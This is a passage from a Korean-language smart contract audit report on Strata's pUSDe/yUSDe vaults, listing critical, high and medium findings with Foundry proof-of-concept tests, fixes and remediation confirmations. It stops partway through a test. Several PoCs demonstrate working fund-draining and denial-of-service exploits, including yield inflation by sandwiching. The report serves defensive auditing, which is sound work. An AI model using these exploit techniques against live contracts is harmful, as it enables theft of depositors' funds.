**수석 감사관**

[Dacian](https://x.com/DevDacian)

[Giovanni Di Siena](https://x.com/giovannidisiena)

**보조 감사관**


---

# 발견 사항 (Findings)
## 치명적 위험 (Critical Risk)


### `pUSDeVault::_withdraw`의 잘못된 상환 회계 처리로 인해 공격자가 수익 창출 단계(yield phase)에서 프로토콜의 `sUSDe` 잔액 전체를 탈취할 수 있음

**설명:** 수익 창출 단계로 전환된 후, 프로토콜의 모든 `USDe` 잔액은 `sUSDe`에 예치되며, `pUSDe`는 `yUSDe` 볼트(vault)에 예치되어 `sUSDe`로부터 추가 수익을 얻을 수 있습니다. 상환을 시작할 때 `yUSDeVault::_withdraw`가 호출되고, 이는 다시 `pUSDeVault::redeem`을 호출합니다:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        if (caller != owner) {
            _spendAllowance(owner, caller, shares);
        }


        _burn(owner, shares);
@>      pUSDeVault.redeem(pUSDeAssets, receiver, address(this));
        emit Withdraw(caller, receiver, owner, pUSDeAssets, shares);
    }
```

이는 `yUSDe` -> `pUSDe` -> `sUSDe`를 원자적으로(atomically) 상환하는 효과를 의도하며, 필요한 `sUSDe` 수익을 미리 계산(preview)하고 적용합니다:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

            if (PreDepositPhase.YieldPhase == currentPhase) {
                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
@>              assets += previewYield(caller, shares);

@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - sUSDe는 자산(assets) 금액만큼의 USDe를 받기 위해 소각해야 할 sUSDe 양을 올림(round up)하여 계산하지만, 아래에서는 이 반올림된 값을 수령인에게 전송하므로 실제로는 프로토콜/yUSDe 예치자에게 불리하게 작용합니다!

                _withdraw(
                    address(sUSDe),
                    caller,
                    receiver,
                    owner,
                    assets, // @audit - 여기에는 수익(yield)이 포함되어서는 안 됩니다. depositedBase에서 차감되기 때문입니다.
                    sUSDeAssets,
                    shares
                );
                return;
            }
        ...
    }
```

그러나 `yUSDe` 상환인 경우와 `sUSDe`에 의해 누적된 수익이 있는 경우에 `assets`를 증가시킴으로써, 의도한 것보다 더 많은 양을 `depositedBase` 상태 변수에서 차감하려고 시도하게 됩니다:

```solidity
    function _withdraw(
            address token,
            address caller,
            address receiver,
            address owner,
            uint256 baseAssets,
            uint256 tokenAssets,
            uint256 shares
        ) internal virtual {
            if (caller != owner) {
                _spendAllowance(owner, caller, shares);
            }
@>          depositedBase -= baseAssets; // @audit - previewYield()가 sUSDe 미리보기를 기반으로 assets를 증가시키기 때문에 yUSDe를 상환할 때 언더플로우가 발생할 수 있습니다. 하지만 이 차감은 실제로 볼트에서 인출된 기본 자산 금액(수익 제외)과 동일해야 합니다.

            _burn(owner, shares);
            SafeERC20.safeTransfer(IERC20(token), receiver, tokenAssets);
            onAfterWithdrawalChecks();

            emit Withdraw(caller, receiver, owner, baseAssets, shares);
            emit OnMetaWithdraw(receiver, token, tokenAssets, shares);
        }
```

잘못된 상태 업데이트로 인해 예기치 않은 언더플로우가 발생하면 `yUSDe` 예치자는 자신의 지분(원금 + 수익)을 상환할 수 없게 될 수 있습니다. 그러나 결함이 있는 `yUSDe` 상환이 성공적으로 처리된다면(즉, `pUSDe`의 기초가 되는 `USDe`의 상대적 양이 `yUSDe`의 총 공급량 및 해당 `sUSDe` 수익에 비해 충분히 큰 경우), `pUSDe` 예치자는 실수로 그리고 예기치 않게 자신이 원래 예치한 것보다 훨씬 적은 `USDe`로 지분을 상환하게 됩니다. 이러한 효과는 후속 `yUSDe` 상환에 의해 확대되는데, `depositedBase`가 실제보다 훨씬 작게 계산됨에 따라 `total_yield_USDe`가 실제보다 크게 계산되기 때문입니다:

```solidity
    function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {
        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {
            uint total_sUSDe = sUSDe.balanceOf(address(this));
            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);

@>          uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);
            uint y_pUSDeShares = balanceOf(caller);

            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);

            return caller_yield_USDe;
        }
        return 0;
    }
```

이는 결과적으로 `depositedBase`가 더 차감되어 결국 0에 수렴하게 만들며, 재정의된 `totalAssets()`에 의존하는 모든 기능에 영향을 미칩니다. `USDe`를 직접 전송하거나 합법적인 수익 발생을 샌드위치 공격(`sUSDe::previewRedeem`이 베스팅 일정을 고려하지 않으므로)함으로써 `sUSDe` 수익을 부풀릴 수 있다는 점을 고려하면, 공격자는 `pUSDe`/`yUSDe` 회계 처리를 완전히 망가뜨리고 다른 모든 예치자의 비용으로 자신의 `yUSDe`를 프로토콜의 `sUSDe` 잔액 거의 전부에 대해 상환할 수 있습니다.

**파급력:** 상당한 사용자 자금 손실.

**개념 증명 (Proof of Concept):**
```solidity
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";

import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";

import {console2} from "forge-std/console2.sol";

contract CritTest is Test {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe public USDe;
    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;

    address account;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        address owner = msg.sender;

        // Prepare Ethena and Ethreal contracts
        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        // Prepare pUSDe and Depositor contracts
        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function test_crit() public {
        uint256 aliceDeposit = 100 ether;
        uint256 bobDeposit = 2 * aliceDeposit;

        // fund users
        USDe.mint(alice, aliceDeposit);
        USDe.mint(bob, bobDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), aliceDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), bobDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);
        vm.stopPrank();

        // setup assertions
        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            account = msg.sender;
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(account);
            USDe.mint(account, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        uint256 sUSDeYieldAmount = 100 ether;
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        {
            // bob redeems from yUSDe
            uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/2, bob, bob);
            uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (1): %s", bobRedeemed_sUSDe);
            console2.log("Bob} redeemed USDe (1): %s", bobRedeemed_USDe);

            // bob can redeem again
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/5, bob, bob);
            uint256 bobRedeemed_sUSDe_2 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_2 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (2): %s", bobRedeemed_sUSDe_2);
            console2.log("Bob redeemed USDe (2): %s", bobRedeemed_USDe_2);

            // bob redeems once more
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/6, bob, bob);
            uint256 bobRedeemed_sUSDe_3 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_3 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (3): %s", bobRedeemed_sUSDe_3);
            console2.log("Bob redeemed USDe (3): %s", bobRedeemed_USDe_3);
        }

        console2.log("pUSDe balance of sUSDe after bob's redemptions: %s", sUSDe.balanceOf(address(pUSDe)));
        console2.log("pUSDe depositedBase after bob's redemptions: %s", pUSDe.depositedBase());

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        console2.log("Alice redeemed sUSDe: %s", aliceRedeemed_sUSDe);
        console2.log("Alice redeemed USDe: %s", aliceRedeemed_USDe);
        console2.log("Alice lost %s USDe", aliceDeposit - aliceRedeemed_USDe);

        // uncomment to observe the assertion fail
        // assertApproxEqAbs(aliceRedeemed_USDe, aliceDeposit, 10, "Alice should redeem approximately her deposit in USDe");
    }
}
```

**권장 완화 방안:** 누적된 수익에 해당하는 자산은 `sUSDe` 인출을 미리 볼 때 포함되어야 하지만, 후속 `_withdraw()` 호출에는 기본 자산(base assets)만 전달되어야 합니다:

```diff
function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

        if (PreDepositPhase.YieldPhase == currentPhase) {
            // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
--          assets += previewYield(caller, shares);
++          uint256 assetsPlusYield = assets + previewYield(caller, shares);

--          uint sUSDeAssets = sUSDe.previewWithdraw(assets);
++          uint sUSDeAssets = sUSDe.previewWithdraw(assetsPlusYield);

            _withdraw(
                address(sUSDe),
                caller,
                receiver,
                owner,
                assets, // @audit - this should not include the yield, since it is decremented from depositedBase
                sUSDeAssets,
                shares
            );
            return;
        }
    ...
}
```

**Strata:** 커밋 [903d052](https://github.com/Strata-Money/contracts/commit/903d0528eedf784a34a393bd9210adb28451b27c)에서 수정됨.

**Cyfrin:** 확인함. 수익은 더 이상 차감되는 자산 금액에 포함되지 않으며, assertion이 포함된 테스트가 이제 통과합니다.

\clearpage
## 고위험 (High Risk)


### 수익 창출 단계에서 지원되는 볼트(supported vaults)를 사용할 때, 사용자가 자격을 가진 볼트 자산을 인출할 수 없음

**설명:** 수익 창출 단계(yield phase)에서 지원되는 볼트를 사용할 때, 사용자는 자신이 자격을 가진 볼트 자산을 인출할 수 없습니다.

**개념 증명 (Proof of Concept):**
```solidity
function test_yieldPhase_supportedVaults_userCantWithdrawVaultAssets() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);
    assertEq(pUSDe.balanceOf(user1), user1MainVaultShares);

    // admin triggers yield phase on main vault which stakes all vault's USDe
    pUSDe.startYieldPhase();
    // totalAssets() still returns same amount as it is overridden in pUSDeVault
    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);
    // balanceOf shows pUSDeVault has deposited its USDe in sUSDe
    assertEq(USDe.balanceOf(address(pUSDe)), 0);
    assertEq(USDe.balanceOf(address(sUSDe)), user1AmountInMainVault);

    // create an additional supported ERC4626 vault
    MockERC4626 newSupportedVault = new MockERC4626(USDe);
    pUSDe.addVault(address(newSupportedVault));
    // add eUSDe again since `startYieldPhase` removes it
    pUSDe.addVault(address(eUSDe));

    // verify two additional vaults now suppported
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));
    assertTrue(pUSDe.isAssetSupported(address(newSupportedVault)));

    // user2 deposits $600 into each vault
    uint256 user2AmountInEachSubVault = 600e18;
    USDe.mint(user2, user2AmountInEachSubVault*2);

    vm.startPrank(user2);
    USDe.approve(address(eUSDe), user2AmountInEachSubVault);
    uint256 user2SubVaultSharesInEach = eUSDe.deposit(user2AmountInEachSubVault, user2);
    USDe.approve(address(newSupportedVault), user2AmountInEachSubVault);
    newSupportedVault.deposit(user2AmountInEachSubVault, user2);
    vm.stopPrank();

    // verify balances correct
    assertEq(eUSDe.totalAssets(), user2AmountInEachSubVault);
    assertEq(newSupportedVault.totalAssets(), user2AmountInEachSubVault);

    // user2 deposits using their shares via MetaVault::deposit
    vm.startPrank(user2);
    eUSDe.approve(address(pUSDe), user2SubVaultSharesInEach);
    pUSDe.deposit(address(eUSDe), user2SubVaultSharesInEach, user2);
    newSupportedVault.approve(address(pUSDe), user2SubVaultSharesInEach);
    pUSDe.deposit(address(newSupportedVault), user2SubVaultSharesInEach, user2);
    vm.stopPrank();

    // verify main vault total assets includes everything
    assertEq(pUSDe.totalAssets(), user1AmountInMainVault + user2AmountInEachSubVault*2);
    // main vault not carrying any USDe balance
    assertEq(USDe.balanceOf(address(pUSDe)), 0);
    // user2 lost their subvault shares
    assertEq(eUSDe.balanceOf(user2), 0);
    assertEq(newSupportedVault.balanceOf(user2), 0);
    // main vault gained the subvault shares
    assertEq(eUSDe.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);
    assertEq(newSupportedVault.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);

    // verify user2 entitled to withdraw their total token amount
    assertEq(pUSDe.maxWithdraw(user2), user2AmountInEachSubVault*2);

    // try and do it, reverts due to insufficient balance
    vm.startPrank(user2);
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(user2AmountInEachSubVault*2, user2, user2);

    // try 1 wei more than largest deposit from user 1, fails for same reason
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(user1AmountInMainVault+1, user2, user2);

    // can withdraw up to max deposit amount $1000
    pUSDe.withdraw(user1AmountInMainVault, user2, user2);

    // user2 still has $200 left to withdraw
    assertEq(pUSDe.maxWithdraw(user2), 200e18);

    // trying to withdraw it reverts
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(200e18, user2, user2);

    // can't withdraw anymore, even trying 1 wei will revert
    vm.expectRevert();
    pUSDe.withdraw(1e18, user2, user2);
}
```

**권장 완화 방안:** `pUSDeVault::_withdraw`에서 수익 창출 단계 `if` 조건 내부에, 만약 인출을 충족하기 위한 `USDe` 잔액이 충분하지 않은 경우 `redeemRequiredBaseAssets` 호출이 있어야 합니다.

또는 다른 잠재적인 해결책은 수익 창출 단계 동안 지원되는 볼트를 추가하는 것을 허용하지 않는 것입니다 (`sUSDe`는 수익 창출 단계가 활성화될 때 추가되므로 제외).

**Strata:** 커밋 [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190)에서 수익 창출 단계 동안 새로운 지원 볼트 추가를 더 이상 허용하지 않음으로써 수정됨.

**Cyfrin:** 확인함.

\clearpage
## 중위험 (Medium Risk)


### `MetaVault::redeemRequiredBaseAssets`는 요청된 금액을 채우기 위해 각 볼트에서 소량의 금액을 상환할 수 있어야 하며 요청된 것보다 많이 상환하는 것을 피해야 함

**설명:** `MetaVault::redeemRequiredBaseAssets`는 지원되는 볼트를 순회하며 필요한 기본 자산 금액을 얻을 때까지 자산을 상환하도록 되어 있습니다:
```solidity
/// @notice Iterates through supported vaults and redeems assets until the required amount of base tokens is obtained
```

그러나 구현에서는 단일 인출이 원하는 금액을 만족할 수 있는 경우에만 지원되는 볼트에서 회수합니다:
```solidity
function redeemRequiredBaseAssets (uint baseTokens) internal {
    for (uint i = 0; i < assetsArr.length; i++) {
        IERC4626 vault = IERC4626(assetsArr[i].asset);
        uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));
        // @audit only withdraw if a single withdraw can satisfy desired amount
        if (totalBaseTokens >= baseTokens) {
            vault.withdraw(baseTokens, address(this), address(this));
            break;
        }
    }
}
```

**파급력:** 여기에는 여러 잠재적인 문제가 있습니다:
1) 단일 인출로 원하는 금액을 만족할 수 없는 경우, 여러 다른 지원 볼트에서 소량의 인출로 원하는 금액을 만족할 수 있더라도 호출 함수는 자금 부족으로 인해 되돌려집니다(revert).
2) 단일 인출이 원하는 금액보다 클 수 있으며, `USDe` 토큰이 볼트 컨트랙트 내에 남게 됩니다. 이는 `sUSDe`에 스테이킹되어 수익을 얻지 못하므로 차선책이며, 수익 창출 단계가 시작되면 지원되는 볼트를 추가하고 입금할 수 있으므로 컨트랙트 소유자가 스테이킹을 트리거할 방법이 없어 보입니다.

**권장 완화 방안:** `MetaVault::redeemRequiredBaseAssets`는 다음과 같이 해야 합니다:
* 현재 상환된 총 금액을 추적
* 남은 요청 금액을 요청 금액에서 현재 상환된 총 금액을 뺀 값으로 계산
* 현재 볼트가 남은 요청 금액을 상환할 수 없는 경우, 가능한 만큼 상환하고 현재 상환된 총 금액을 상환된 금액만큼 증가시킴
* 현재 볼트가 남은 요청 금액보다 더 많이 상환할 수 있는 경우, 남은 요청 금액을 충족할 만큼만 상환

위의 전략은 다음을 보장합니다:
* 여러 볼트의 소액을 사용하여 요청된 금액을 충족할 수 있음
* 요청된 것보다 많은 금액이 인출되지 않으므로, 스테이킹되지 않고 수익을 얻지 못하는 `USDe` 토큰이 볼트 내에 남지 않음

**Strata:** 커밋 [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298), [7e6e859](https://github.com/Strata-Money/contracts/commit/7e6e8594c05ea7e3837ddbe7395b4a15ea34c7e9)에서 수정됨.

**Cyfrin:** 확인함.


### 포인트 단계(points phase) 동안 하나의 볼트가 일시 중지되거나 시도된 상환이 최대치를 초과하면 메타 볼트 인출에 대한 서비스 거부(DoS) 발생

**설명:** `pUSDeVault::_withdraw`는 모든 `USDe` 부족분이 다중 볼트에 의해 커버된다고 가정합니다. 그러나 `redeemRequiredBaseAssets()`는 필요한 자산이 이용 가능하거나 실제로 인출되는 것을 보장하지 않으므로, ERC-4626 인출이 이미 되돌려지지 않더라도 후속 ERC-20 토큰 전송이 실패하여 인출에 대한 서비스 거부(DoS)가 발생할 수 있습니다. `redeemRequiredBaseAssets()`에서 `ERC4626Upgradeable::previewRedeem`을 사용하는 것은 문제가 있는데, 이는 볼트가 허용하는 것보다 더 많은 자산을 인출하려고 시도할 수 있기 때문입니다. [ERC-4626 사양](https://eips.ethereum.org/EIPS/eip-4626)에 따르면 `previewRedeem()`은:
> * maxRedeem에서 반환된 것과 같은 상환 제한을 고려해서는 안 되며(MUST NOT), 사용자가 충분한 지분을 가지고 있는지 등에 관계없이 상환이 수락되는 것처럼 항상 작동해야 합니다.
> * 볼트 별 사용자/글로벌 제한으로 인해 되돌려져서는 안 됩니다(MUST NOT). 상환을 되돌리게 하는 다른 조건으로 인해 되돌려질 수 있습니다(MAY).

따라서 다른 볼트에서 상환하여 인출을 처리할 수 있는 경우에도 하나의 볼트가 되돌려지는 것을 방지하기 위해 일시 중지 상태 및 기타 제한을 고려하는 `maxWithdraw()`와 같은 가용성 인식 확인을 대신 사용해야 합니다.

**파급력:** 지원되는 메타 볼트 중 하나가 일시 중지되거나 포인트 단계 동안 주가 하락을 초래하는 기본 `USDe` 해킹을 겪는 경우, 다른 볼트에서 상환하여 처리할 수 있더라도 인출 처리가 방지됩니다.

**개념 증명 (Proof of Concept):** 먼저 입금/인출을 일시 중지하고 `previewRedeem()`과 비교할 때 `maxWithdraw()`를 조회하면 더 적은 자산을 반환할 수 있는 볼트를 시뮬레이션하기 위해 `MockERC4626`을 수정합니다:

```solidity
contract MockERC4626 is ERC4626 {
    bool public depositsEnabled;
    bool public withdrawalsEnabled;
    bool public hacked;

    error DepositsDisabled();
    error WithdrawalsDisabled();

    event DepositsEnabled(bool enabled);
    event WithdrawalsEnabled(bool enabled);

    constructor(IERC20 token) ERC20("MockERC4626", "M4626") ERC4626(token)  {}

    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        if (!depositsEnabled) {
            revert DepositsDisabled();
        }

        super._deposit(caller, receiver, assets, shares);
    }

    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
        override
    {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        super._withdraw(caller, receiver, owner, assets, shares);
    }

    function maxWithdraw(address owner) public view override returns (uint256) {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        if (hacked) {
            return super.maxWithdraw(owner) / 2; // Reduce max withdraw by half to simulate some limit
        }
        return super.maxWithdraw(owner);
    }

    function totalAssets() public view override returns (uint256) {
        if (hacked) {
            return super.totalAssets() * 3/4; // Reduce total assets by 25% to simulate some loss
        }
        return super.totalAssets();
    }

    function setDepositsEnabled(bool depositsEnabled_) external {
        depositsEnabled = depositsEnabled_;
        emit DepositsEnabled(depositsEnabled_);
    }

    function setWithdrawalsEnabled(bool withdrawalsEnabled_) external {
        withdrawalsEnabled = withdrawalsEnabled_;
        emit WithdrawalsEnabled(withdrawalsEnabled_);
    }

    function hack() external {
        hacked = true;
    }
}
```

그런 다음 `pUSDeVault.t.sol`에서 다음 테스트를 실행할 수 있습니다:
```solidity
error WithdrawalsDisabled();
error ERC4626ExceededMaxWithdraw(address owner, uint256 assets, uint256 max);
error ERC20InsufficientBalance(address from, uint256 balance, uint256 amount);

function test_redeemRequiredBaseAssetsDoS() public {
    assert(address(USDe) != address(0));

    account = msg.sender;

    // deposit USDe
    USDe.mint(account, 10 ether);
    deposit(USDe, 10 ether);
    assertBalance(pUSDe, account, 10 ether, "Initial deposit");

    // deposit eUSDe
    USDe.mint(account, 10 ether);
    USDe.approve(address(eUSDe), 10 ether);
    eUSDe.setDepositsEnabled(true);
    eUSDe.deposit(10 ether, account);
    assertBalance(eUSDe, account, 10 ether, "Deposit to eUSDe");
    eUSDe.approve(address(pUSDeDepositor), 10 ether);
    pUSDeDepositor.deposit(eUSDe, 10 ether, account);

    // simulate trying to withdraw from the eUSDe vault when it is paused
    uint256 withdrawAmount = 20 ether;
    eUSDe.setWithdrawalsEnabled(false);
    vm.expectRevert(abi.encodeWithSelector(WithdrawalsDisabled.selector));
    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);
    eUSDe.setWithdrawalsEnabled(true);


    // deposit USDe from another account
    account = address(0x1234);
    vm.startPrank(account);
    USDe.mint(account, 10 ether);
    USDe.approve(address(eUSDe), 10 ether);
    eUSDe.deposit(10 ether, account);
    assertBalance(eUSDe, account, 10 ether, "Deposit to eUSDe");
    eUSDe.approve(address(pUSDeDepositor), 10 ether);
    pUSDeDepositor.deposit(eUSDe, 10 ether, account);
    vm.stopPrank();
    account = msg.sender;
    vm.startPrank(account);

    // deposit eUSDe2
    USDe.mint(account, 5 ether);
    USDe.approve(address(eUSDe2), 5 ether);
    eUSDe2.setDepositsEnabled(true);
    eUSDe2.deposit(5 ether, account);
    assertBalance(eUSDe2, account, 5 ether, "Deposit to eUSDe2");
    eUSDe2.approve(address(pUSDeDepositor), 5 ether);
    pUSDeDepositor.deposit(eUSDe2, 5 ether, account);


    // simulate when previewRedeem() in redeemRequiredBaseAssets() returns more than maxWithdraw() during withdrawal
    // as a result of a hack and imposition of a limit
    eUSDe.hack();
    uint256 maxWithdraw = eUSDe.maxWithdraw(address(pUSDe));
    vm.expectRevert(abi.encodeWithSelector(ERC4626ExceededMaxWithdraw.selector, address(pUSDe), withdrawAmount/2, maxWithdraw));
    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);

    // attempt to withdraw from eUSDe2 vault, but redeemRequiredBaseAssets() skips withdrawal attempt
    // so there are insufficient assets to cover the subsequent transfer even though there is enough in the vaults
    eUSDe2.setWithdrawalsEnabled(true);
    vm.expectRevert(abi.encodeWithSelector(ERC20InsufficientBalance.selector, address(pUSDe), eUSDe2.balanceOf(address(pUSDe)), withdrawAmount));
    pUSDe.withdraw(address(eUSDe2), withdrawAmount, account, account);
}
```

**권장 완화 방안:**
```diff
    function redeemRequiredBaseAssets (uint baseTokens) internal {
        for (uint i = 0; i < assetsArr.length; i++) {
            IERC4626 vault = IERC4626(assetsArr[i].asset);
--          uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));
++          uint256 totalBaseTokens = vault.maxWithdraw(address(this));
            if (totalBaseTokens >= baseTokens) {
                vault.withdraw(baseTokens, address(this), address(this));
                break;
            }
        }
    }
```

**Strata:** 커밋 [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298)에서 수정됨.

**Cyfrin:** 확인함.


### pUSDe 상환이 프로토콜/yUSDe 예치자에게 불리하게 반올림되어 가치 누출 발생

**설명:** 수익 창출 단계로 전환된 후, `pUSDe`와 `yUSDe`의 상환 모두 `pUSDeVault::_withdraw`에 의해 처리되어 `sUSDe`로 지급됩니다. 이는 `previewWithdraw()` 함수를 호출하여 필요한 `USDe` 금액에 해당하는 `sUSDe` 잔액을 계산함으로써 달성됩니다:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

            if (PreDepositPhase.YieldPhase == currentPhase) {
                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
@>              assets += previewYield(caller, shares);

@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - sUSDe는 자산(assets) 금액만큼의 USDe를 받기 위해 소각해야 할 sUSDe 양을 올림(round up)하여 계산하지만, 아래에서는 이 반올림된 값을 수령인에게 전송하므로 실제로는 프로토콜/yUSDe 예치자에게 불리하게 작용합니다!

                _withdraw(
                    address(sUSDe),
                    caller,
                    receiver,
                    owner,
                    assets, // @audit - 여기에는 수익(yield)이 포함되어서는 안 됩니다. depositedBase에서 차감되기 때문입니다.
                    sUSDeAssets,
                    shares
                );
                return;
            }
        ...
    }
```

이 문제의 요점은 `previewWithdraw()`가 지정된 `USDe` 금액을 받기 위해 소각해야 하는 필수 `sUSDe` 잔액을 반환하므로 그에 따라 올림(round up)을 수행한다는 것입니다. 그러나 여기서는 이 반올림된 `sUSDe` 금액이 프로토콜 외부로 전송됩니다. 이는 상환이 실제로 수령인에게 유리하고 프로토콜/yUSDe 예치자에게 불리하게 반올림된다는 것을 의미합니다.

**파급력:** 다른 `yUSDe` 예치자를 희생시키면서 `pUSDe` 상환에 유리하게 시스템에서 가치가 누출될 수 있습니다.

**개념 증명 (Proof of Concept):** C-01의 완화 조치가 적용되지 않으면 완전히 상환된 금액을 결정하려고 할 때 언더플로우로 인해 다음 테스트가 되돌려진다는 점에 유의하십시오:

```solidity
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";

import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";

import {console2} from "forge-std/console2.sol";

contract RoundingTest is Test {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe public USDe;
